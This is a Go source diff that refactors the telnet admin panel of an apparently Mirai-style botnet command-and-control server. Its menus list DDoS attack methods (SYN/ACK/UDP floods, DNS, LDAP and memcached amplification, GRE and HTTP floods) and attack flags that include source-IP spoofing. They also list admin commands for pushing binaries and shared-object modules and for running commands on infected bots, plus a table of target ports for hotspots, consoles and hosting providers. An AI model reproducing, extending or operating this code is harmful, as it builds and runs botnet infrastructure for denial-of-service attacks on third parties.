@@ -3,43 +3,106 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net"
 	"net/http"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
+
+var (
+	rateMu       sync.Mutex
+	rateMap      = make(map[string]int)
+	rateTicker   = time.NewTicker(time.Second)
+	lastCmdMutex sync.Mutex
+	lastCmd      = make(map[string]string)
+)
+
+func init() {
+	go func() {
+		for range rateTicker.C {
+			rateMu.Lock()
+			rateMap = make(map[string]int)
+			rateMu.Unlock()
+		}
+	}()
+}
+
+func checkRateLimit(username string) bool {
+	rateMu.Lock()
+	defer rateMu.Unlock()
+	rateMap[username]++
+	return rateMap[username] <= 5
+}
 
 type Admin struct {
 	conn     net.Conn
 	username string
 	R        *Render
+	connMu   sync.Mutex
+	animStop chan struct{}
+	animMu   sync.Mutex
+}
+
+func (this *Admin) w(s string) {
+	this.connMu.Lock()
+	this.conn.Write([]byte(s))
+	this.connMu.Unlock()
 }
 
 func NewAdmin(conn net.Conn) *Admin {
-	return &Admin{conn, "", NewRender(conn)}
+	return &Admin{conn: conn, R: NewRender(conn)}
 }
 
 func (this *Admin) writeBanner() {
 	this.conn.Write([]byte(CCls))
-	this.conn.Write([]byte("\r\n" +
-		CPink + "  ███████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗   ██╗\r\n" +
-		CPink + "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗╚██╗ ██╔╝\r\n" +
-		CPink + "  █████╗  █████╗  ██╔████╔██║██████╔╝██║   ██║ ╚████╔╝ \r\n" +
-		CPink + "  ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║  ╚██╔╝  \r\n" +
-		CPink + "  ██║     ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   \r\n" +
-		CPink + "  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n" +
-		CGray + "  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗\r\n" +
-		CGray + "  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝\r\n" +
-		CGray + "  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ \r\n" +
-		CGray + "  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ \r\n" +
-		CGray + "  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗\r\n" +
-		CGray + "  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n" +
-		CReset + "\r\n"))
+	this.R.Banner()
+}
+
+func (this *Admin) startAnim() {
+	this.animMu.Lock()
+	defer this.animMu.Unlock()
+	if this.animStop != nil {
+		return
+	}
+	this.animStop = make(chan struct{})
+	go func() {
+		frame := 0
+		for {
+			select {
+			case <-this.animStop:
+				return
+			default:
+			}
+			time.Sleep(200 * time.Millisecond)
+			frame++
+			select {
+			case <-this.animStop:
+				return
+			default:
+				this.R.Write(fmt.Sprintf(
+					"\033[s\033[15;1H\033[K               by %s%s (unitdev.run)\033[u",
+					colorWord(frame), CPink,
+				))
+			}
+		}
+	}()
+}
+
+func (this *Admin) stopAnim() {
+	this.animMu.Lock()
+	defer this.animMu.Unlock()
+	if this.animStop != nil {
+		close(this.animStop)
+		this.animStop = nil
+	}
 }
 
 func (this *Admin) Handle() {
@@ -47,7 +110,9 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
 
 	defer func() {
+		this.stopAnim()
 		this.conn.Write([]byte("\033[?1049l"))
+		this.conn.Close()
 	}()
 
 	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
@@ -107,7 +172,8 @@ func (this *Admin) Handle() {
 	if userInfo.maxBots != -1 && online > userInfo.maxBots {
 		online = userInfo.maxBots
 	}
-	this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m  online: \x1b[97m%d\x1b[0m  |  help / methods\r\n\r\n", online)))
+	this.R.RowMuted(fmt.Sprintf("  online: %d  |  help / methods", online))
+	this.startAnim()
 
 	var cmdHistory []string
 	for {
@@ -119,6 +185,7 @@ func (this *Admin) Handle() {
 		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLS" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
 			this.writeBanner()
+			this.startAnim()
 			continue
 		}
 		if err != nil || cmd == "exit" || cmd == "quit" {
@@ -136,115 +203,173 @@ func (this *Admin) Handle() {
 		botCount = userInfo.maxBots
 
 		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "DDOS" || cmd == "ddos" || cmd == "ATTACK" {
-			this.conn.Write([]byte("\x1b[38;5;52m TCP  - syn, ack, usyn, tcpall, frag, asyn, socket, orbitv3, nfolag, connect\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;52m UDP  - plain, std, cudp, dns, ldap, chargen, memcached\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;52m GRE  - greip, greeth, mptcpgre, grestack\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;52m L7   - http, scanports\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;240m e.g. syn 1.2.3.4 60 dport=80 burst=16\r\n"))
+			this.R.BoxTop(50)
+			this.R.BoxRow("TCP: syn, ack, usyn, tcpall, frag, asyn, socket, orbitv3, nfolag, connect")
+			this.R.BoxRow("L7: http, hellone, exterogen, voult, discord")
+			this.R.BoxRow("UDP: plain, std, game, cudp, dns, ldap, chargen, memcached, udpx")
+			this.R.BoxRow("GRE: greip, greeth, mptcpgre, grestack")
+			this.R.BoxRow("L7:  http, scanports")
+			this.R.BoxRow(CGray + "e.g. syn 1.2.3.4 60 dport=80 burst=16")
+			this.R.BoxBot(50)
 			continue
 		}
 
 		if err != nil || cmd == "TCP" || cmd == "tcp" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m syn [ip] [time] [dport=80 ...]       - syn           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m usyn [ip] [time] [dport=80 ...]      - usyn          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ack [ip] [time] [dport=80 ...]       - ack           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tcpall [ip] [time] [dport=80 ...]    - tcpall        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m frag [ip] [time] [dport=80 ...]      - frag          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m asyn [ip] [time] [dport=80 ...]      - asyn          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m socket [ip] [time] [dport=80 ...]    - socket        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m orbitv3 [ip] [time] [burst=4 ...]    - orbitv3       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m nfolag [ip] [time] [usyn=0|1 ...]    - nfolag        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m connect [ip] [time] dport=80 conns=256 - exhaustion  \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m FLAGS - full flag list                               \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxRow("syn [ip] [time] [dport=80 ...]       — syn flood")
+			this.R.BoxRow("usyn [ip] [time] [dport=80 ...]      — usyn flood")
+			this.R.BoxRow("ack [ip] [time] [dport=80 ...]       — ack flood")
+			this.R.BoxRow("tcpall [ip] [time] [dport=80 ...]    — tcp all flags")
+			this.R.BoxRow("frag [ip] [time] [dport=80 ...]      — frag flood")
+			this.R.BoxRow("asyn [ip] [time] [dport=80 ...]      — asyn flood")
+			this.R.BoxRow("socket [ip] [time] [dport=80 ...]    — socket flood")
+			this.R.BoxRow("orbitv3 [ip] [time] [burst=4 ...]    — orbitv3")
+			this.R.BoxRow("nfolag [ip] [time] [usyn=0|1 ...]    — nfolag")
+			this.R.BoxRow("connect [ip] [time] dport=80 conns=N — exhaustion")
+			this.R.BoxRow(CPink + "FLAGS" + CWhiteB + "  — full flag list")
+			this.R.BoxBot(56)
 			continue
 		}
 
 		if err != nil || cmd == "UDP" || cmd == "udp" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m plain [ip] [time] [dport=80 len=4096] - plain         \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m std [ip] [time] [dport=80 len=1024]  - std           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m cudp [ip] [time] [dport=80 ...]       - cudp          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m dns [ip] [time] dport=53 domain=x.com - dns           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ldap [ip] [time] dport=389 len=512   - ldap amplify  \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m chargen [ip] [time] dport=19         - chargen       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m memcached [ip] [time] dport=11211    - memcached     \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxRow("plain [ip] [time] [dport=80 len=4096]   — plain udp")
+			this.R.BoxRow("std [ip] [time] [dport=80 len=1024]    — std udp")
+			this.R.BoxRow("cudp [ip] [time] [dport=80 ...]        — cudp flood")
+			this.R.BoxRow("dns [ip] [time] dport=53 domain=x.com  — dns amplify")
+			this.R.BoxRow("ldap [ip] [time] dport=389 len=512     — ldap amplify")
+			this.R.BoxRow("chargen [ip] [time] dport=19           — chargen")
+			this.R.BoxRow("memcached [ip] [time] dport=11211      — memcached")
+			this.R.BoxBot(56)
 			continue
 		}
 
 		if err != nil || cmd == "GRE" || cmd == "gre" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greip [ip] [time] [dport=80 ...]      - greip        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greeth [ip] [time] [dport=80 ...]     - gre eth      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m mptcpgre [ip] [time] [burst=64 ...]   - mptcpgre     \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m grestack [ip] [time] [burst=32 ...]   - gre stack    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxRow("greip [ip] [time] [dport=80 ...]       — greip")
+			this.R.BoxRow("greeth [ip] [time] [dport=80 ...]      — gre eth")
+			this.R.BoxRow("mptcpgre [ip] [time] [burst=64 ...]    — mptcpgre")
+			this.R.BoxRow("grestack [ip] [time] [burst=32 ...]    — gre stack")
+			this.R.BoxBot(56)
 			continue
 		}
 
 		if err != nil || cmd == "L7" || cmd == "l7" || cmd == "layer7" || cmd == "LAYER7" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m http [ip] [time] domain=[ip] conns=[300]    - http \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m scanports [ip] [1] ports=80,443,23         - scan  \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxRow("http [ip] [time] domain=[ip] conns=[300]   — http flood")
+			this.R.BoxRow("scanports [ip] [1] ports=80,443,23        — port scan")
+			this.R.BoxBot(56)
 			continue
 		}
 
 		if err != nil || cmd == "FLAGS" || cmd == "flags" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m attack method ip time [flag1=val1 flag2=val2 ...]       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m or method ip time ?  - flags for this method           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╠══════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m len=512     - payload size (bytes)                      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m rand=1|0   - randomize payload                          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tos=0       - IP TOS                                   \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ident=0    - IP ID (65535=random)                       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ttl=64     - IP TTL                                    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m df=1|0     - don't fragment                             \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m sport=0    - source port (0/65535=random)               \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m dport=80   - dest port                                 \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m burst=4    - orbitv3/mptcpgre/grestack burst             \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m usyn=0|1   - nfolag: 0=asyn 1=usyn                      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m domain=x   - dns: query domain                        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m conns=256  - connect: parallel conns                   \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ports=80,443 - scanports port list                      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m source=ip  - spoof source (admin)                       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(68)
+			this.R.BoxRow("attack method ip time [flag=val flag=val ...]")
+			this.R.BoxRow("or  method ip time ?  — show flags for this method")
+			this.R.BoxMid(68)
+			this.R.BoxRow("len=N        — payload size (bytes)")
+			this.R.BoxRow("rand=1|0     — randomize payload")
+			this.R.BoxRow("tos=0        — IP TOS")
+			this.R.BoxRow("ident=0      — IP ID (65535=random)")
+			this.R.BoxRow("ttl=64       — IP TTL")
+			this.R.BoxRow("df=1|0       — don't fragment")
+			this.R.BoxRow("sport=0      — source port (0/65535=random)")
+			this.R.BoxRow("dport=80     — dest port")
+			this.R.BoxRow("burst=4      — orbitv3/mptcpgre/grestack burst")
+			this.R.BoxRow("usyn=0|1     — nfolag: 0=asyn 1=usyn")
+			this.R.BoxRow("domain=x     — dns: query domain")
+			this.R.BoxRow("conns=256    — connect: parallel conns")
+			this.R.BoxRow("ports=80,443 — scanports: port list")
+			this.R.BoxRow(CPink + "source=ip" + CWhiteB + " — spoof source (admin)")
+			this.R.BoxBot(68)
 			continue
 		}
 
 		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
-			this.conn.Write([]byte("\x1b[38;5;202m METHODS  - attack categories (TCP/UDP/GRE/L7)\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m FLAGS    - attack flags help\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m COUNT    - online bots\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m INFO     - your limits\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m HISTORY  - last attacks (history up = asc)\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m PORTS    - common ports\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m TOOLS    - ping, whois, resolve...\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ADMIN    - admin commands (admin only)\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m CLS/c    - clear screen\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m -N cmd   - limit to N bots, e.g. -100 syn 1.2.3.4 60\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m @src cmd - filter by source, e.g. @x86 plain 1.2.3.4 60\r\n"))
+			// parse HELP [page|command]
+			helpArg := ""
+			if parts := strings.Fields(cmd); len(parts) > 1 {
+				helpArg = strings.ToUpper(parts[1])
+			}
+
+			switch helpArg {
+			case "2":
+				this.R.BoxTop(65)
+				this.R.BoxRow(CPink + "INFO" + CWhiteB + "     — your account limits")
+				this.R.BoxRow(CPink + "TOOLS" + CWhiteB + "    — ping, whois, resolve, tracer...")
+				this.R.BoxRow(CPink + "PORTS" + CWhiteB + "    — common target ports")
+				this.R.BoxRow(CPink + "HISTORY" + CWhiteB + "  — last attacks")
+				this.R.BoxRow(CPink + "AT" + CWhiteB + "         — schedule attack")
+				this.R.BoxRow(CPink + "ACTIVE" + CWhiteB + "     — show active attacks")
+				this.R.BoxRow(CPink + "COUNT" + CWhiteB + "    — online bot count")
+				this.R.BoxRow(CPink + "PEERS" + CWhiteB + "    — cluster node status")
+				this.R.BoxRow(CPink + "CLS/C" + CWhiteB + "    — clear screen")
+				this.R.BoxBot(65)
+			case "3":
+				this.R.BoxTop(65)
+				this.R.BoxRow(CPink + "ADDUSER" + CWhiteB + "    — add user (admin)")
+				this.R.BoxRow(CPink + "RMUSER" + CWhiteB + "     — remove user (admin)")
+				this.R.BoxRow(CPink + "USERS" + CWhiteB + "     — list users (admin)")
+				this.R.BoxRow(CPink + "BOTS" + CWhiteB + "      — bot list (admin)")
+				this.R.BoxRow(CPink + "BLACKLIST" + CWhiteB + " — manage blacklist (admin)")
+				this.R.BoxRow(CPink + "WHITELIST" + CWhiteB + " — manage whitelist (admin)")
+				this.R.BoxRow(CPink + "UPDATE" + CWhiteB + "    — update bot binary (admin)")
+				this.R.BoxRow(CPink + "SELFUPDATE" + CWhiteB + " — run cmd on bots (admin)")
+				this.R.BoxRow(CPink + "STOP" + CWhiteB + "      — stop all attacks (admin)")
+				this.R.BoxRow(CPink + "SENDMODULE" + CWhiteB + "  — send .so to bots (admin)")
+				this.R.BoxRow(CPink + "BUILDMODULE" + CWhiteB + " — compile module (admin)")
+			this.R.BoxRow(CPink + "MODULES" + CWhiteB + "     — list available modules (admin)")
+			this.R.BoxRow(CPink + "UNLOADMODULE" + CWhiteB + " — unload module (admin)")
+				this.R.BoxBot(65)
+			case "ADDUSER", "ADDADMIN":
+				this.R.Rowf("ADDUSER <user> <pass> <maxbots> <dur> <cd>  — add user")
+				this.R.Rowf("ADDADMIN <user> <pass> <maxbots> <dur> <cd> — add admin")
+				this.R.Rowf("  maxbots: bot limit (-1 = unlimited)")
+				this.R.Rowf("  dur: attack duration limit in seconds (0 = blocked)")
+				this.R.Rowf("  cd: cooldown between attacks in seconds")
+			case "BOTS":
+				this.R.Rowf("BOTS [limit] [@arch] [dns] — list bots")
+				this.R.Rowf("  BOTS 20     — show 20 bots")
+				this.R.Rowf("  BOTS @x86   — filter by arch")
+				this.R.Rowf("  BOTS dns    — show only DNS bots")
+			default:
+				this.R.BoxTop(65)
+				this.R.BoxRow(CPink + "ATTACK" + CWhiteB + "   — attack methods (TCP/UDP/GRE/L7)")
+				this.R.BoxRow(CPink + "FLAGS" + CWhiteB + "    — all attack flags")
+				this.R.BoxRow(CPink + "INFO" + CWhiteB + "     — your account limits")
+				this.R.BoxRow(CPink + "TOOLS" + CWhiteB + "    — ping, whois, resolve, tracer...")
+				this.R.BoxRow(CPink + "PORTS" + CWhiteB + "    — common target ports")
+				this.R.BoxRow(CPink + "HISTORY" + CWhiteB + "  — last attacks (history up = asc)")
+				this.R.BoxRow(CPink + "AT" + CWhiteB + "         — schedule attack")
+				this.R.BoxRow(CPink + "ACTIVE" + CWhiteB + "     — show active attacks")
+				this.R.BoxRow(CPink + "COUNT" + CWhiteB + "    — online bot count")
+				this.R.BoxRow(CPink + "PEERS" + CWhiteB + "    — cluster node status")
+				this.R.BoxRow(CPink + "ADMIN" + CWhiteB + "    — admin panel (admin only)")
+				this.R.BoxRow(CPink + "BLACKLIST" + CWhiteB + " — manage blacklist (admin)")
+				this.R.BoxRow(CPink + "WHITELIST" + CWhiteB + " — manage whitelist (admin)")
+				this.R.BoxMid(65)
+				this.R.BoxRow(CGray + "HELP 2 — user commands")
+				this.R.BoxRow(CGray + "HELP 3 — admin commands")
+				this.R.BoxRow(CGray + "HELP <cmd> — specific help")
+				this.R.BoxRow(CGray + " -N cmd — limit to N bots (e.g. -100 syn ...)")
+				this.R.BoxRow(CGray + " @src   — filter by arch (e.g. @x86 plain ...)")
+				this.R.BoxBot(65)
+			}
 			continue
 		}
 
 		if err != nil || cmd == "TOOLS" || cmd == "tools" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════╗ \r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PING     - Pngs an IP            \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m IPLOOKUP - Shows IP info         \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m WHOIS    - Runs a WHOIS check    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TRACER   - Traceroute on IP      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m RESOLVE  - Resolves Domain       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m REVDNS   - Shows DNS of IP       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ASNLOOKUP- Shows ASN of IP       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m SUBCALC  - Calculates Subnet     \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ZTRANSF  - Shows ZoneTransfer    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m SCANPORTS- Port scan via bots    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m EXPLOITS - Last exploit findings  \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HISTORY  - Attack history up/down \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════╝\r\n"))
+			this.R.BoxTop(56)
+			this.R.BoxRow("ping [host]       — ping host")
+			this.R.BoxRow("resolve [domain]  — resolve domain")
+			this.R.BoxRow("whois [ip/host]   — whois lookup")
+			this.R.BoxRow("tracer [host]     — trace route")
+			this.R.BoxRow("portscan [host]   — port scan")
+			this.R.BoxRow("cportscan [range] — CIDR port scan")
+			this.R.BoxRow("geoip [ip]        — ip geolocation")
+			this.R.BoxRow("profind [name]    — profile finder")
+			this.R.BoxRow("query [filter]    — e.g. ?syn")
+			this.R.BoxBot(56)
 			continue
 		}
 
@@ -299,46 +424,43 @@ func (this *Admin) Handle() {
 		}
 
 		if err != nil || cmd == "PORTS" || cmd == "ports" {
-			this.conn.Write([]byte("\x1b[38;5;202m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT PORTS:                     VERIZON 4G LTE:                 \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m UDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TCP - 2859, 5000                   TCP - 53                        \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots            \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m GENERAL PORTS:                                                     \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOME: 80, 53, 22, 8080             Please do not Abuse             \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m XBOX: 3074                          Any of our tools               \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS4: 9307                            As they are here              \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS3:                                   Just for                    \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -TCP:3478, 3479, 3480, 5223            Educational Purposes       \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -UDP:3478, 3479                            ONLY!                  \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT: 9286                                                      \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m VPN: 7777                              OwO                         \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m NFO: 1192                                                          \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m OVH: 992                                                           \x1b[38;5;202m║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HTTP: 80, 8080,443                                                \x1b[38;5;202m ║\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
+			this.R.BoxTop(70)
+			this.R.BoxRow(CPink + "HOTSPOT PORTS:" + CGray + "              " + CPink + "VERIZON 4G LTE:")
+			this.R.BoxRow("UDP 1900                       UDP 53,123,500,4500,52248")
+			this.R.BoxRow("TCP 2859,5000                  TCP 53")
+			this.R.BoxMid(70)
+			this.R.BoxRow(CPink + "AT&T Wi-Fi HOTSPOTS" + CGray + "          " + CPink + "ATTACK PORTS:")
+			this.R.BoxRow("UDP 137,138,139,445,8053       699  Good For Hotspots")
+			this.R.BoxRow("TCP 1434,8053,8083,8084        5060 Router Reset")
+			this.R.BoxMid(70)
+			this.R.BoxRow(CPink + "GENERAL PORTS:")
+			this.R.BoxRow("HOME: 80,53,22,8080            HTTP: 80,8080,443")
+			this.R.BoxRow("XBOX: 3074                     VPN: 7777")
+			this.R.BoxRow("PS4: 9307                      NFO: 1192")
+			this.R.BoxRow("PS3: TCP 3478-3480,5223        OVH: 992")
+			this.R.BoxRow("     UDP 3478,3479             HOTSPOT: 9286")
+			this.R.BoxBot(70)
 			continue
 		}
 
 		if err != nil || cmd == "admin" || cmd == "ADMIN" {
-			this.conn.Write([]byte("\x1b[38;5;202m \x1b[38;5;52madmin commands\x1b[38;5;202m\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  ADDUSER     - add user\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;202m  ADDADMIN    - add admin (*ADDADMIN*)\r\n"))
